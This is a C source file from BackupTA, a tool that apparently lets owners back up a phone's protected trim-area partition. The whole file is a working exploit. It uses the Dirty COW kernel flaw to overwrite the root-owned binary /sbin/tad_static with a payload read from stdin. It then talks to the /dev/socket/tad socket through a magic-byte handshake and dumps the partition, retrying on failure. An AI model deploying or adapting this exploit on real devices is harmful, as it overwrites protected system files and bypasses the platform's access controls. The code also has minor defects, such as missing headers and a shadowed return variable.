/*
 *   This file is part of BackupTA.

 *  BackupTA is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.

 *  BackupTA is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.

 *  You should have received a copy of the GNU General Public License
 *  along with BackupTA.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/capability.h>
#include <selinux/selinux.h>
#include <selinux/context.h>
#include <selinux/android.h>
#include <selinux/label.h>
#include <selinux/avc.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <time.h>
#include "dirtycow.h"

#define EXPECTED_SIZE (2*1024*1024)

int perform_exploit(const char *buf, int length)
{
  int ret;
  fprintf(stderr, "Attempting exploit with buf of length %d\n", length);
  fflush(stderr);
  ret = overwrite_file("/sbin/tad_static", buf, length);
  if(ret)
  {
    fprintf(stderr, "Error dirtycowing, trying again...\n");
    return -1;
  }
  fprintf(stderr, "Waiting for result....\n");
  struct sockaddr_un remote;

  int s = socket(AF_UNIX, SOCK_STREAM, 0);
  if(s < 0)
  {
    fprintf(stderr, "Error creating unix socket: %s\n", strerror(errno));
    return -1;
  }
  remote.sun_family = AF_UNIX;
  strcpy(remote.sun_path, "/dev/socket/tad");
  int len = strlen(remote.sun_path) + sizeof(remote.sun_family);
  if (connect(s, (struct sockaddr *)&remote, len) == -1) {
    fprintf(stderr, "Error connecting to unix socket: %s\n", strerror(errno));
    return -2;
  }
  write(s, "\42\42\42\42", 4);
  char buffer[1024];
  int sz;
  int total = 0;

  sz = read(s, buffer, 4);
  if(memcmp(buffer, "\43\43\43\43", 4))
  {
    fprintf(stderr, "Bad reply received, failing...\n");
    close(s);
    return -3;
  }

  while((sz = read(s, buffer, 1024)) > 0)
  {
    fwrite(buffer, 1, sz, stdout);
    total += sz;
  }
  fprintf(stderr,"Got a total of %d bytes\n", total);

  close(s);
  return total;
}


#define BUF_LEN (10*1024)
#define READLEN 1024
char *readfile(FILE* file, int *filelength)
{
  int length = 0;
  int sz = 0;
  int idx = 0;
  char *buf = NULL;
  int buflen = BUF_LEN;

  buf = malloc(BUF_LEN);
  fprintf(stderr, "Reading dumpta from stdin...\n");
  while((sz = fread(&buf[idx], 1, READLEN, file)) > 0)
  {
    length += sz;
    idx += sz;
    // Make room for next read if needed
    if(length + READLEN > buflen)
    {
        buflen = buflen + BUF_LEN;
        buf = realloc(buf, buflen);
    }
  }
  *filelength = length;
  return buf;
}


int main()
{
  int retries = 10;
  int ret = -1;
  int buflen = 0;
  char *buf = readfile(stdin, &buflen);
  fprintf(stderr, "Read dumpta from stdin at %d bytes\n", buflen);
  fflush(stderr);
  while(retries-- > 0) {
    int ret = perform_exploit(buf, buflen);
    if (ret < 0) {
      usleep(500000);
      continue;
    }
    if(ret == EXPECTED_SIZE)
    {
      fprintf(stderr, "Exploit successful!\n");
      ret = 0;
      break;
    } else
    {
      fprintf(stderr, "TA Size unexpected at %d bytes (expected %d bytes)\n", ret, EXPECTED_SIZE);
      ret = 1;
      break;
    }
  }
  return ret;
}
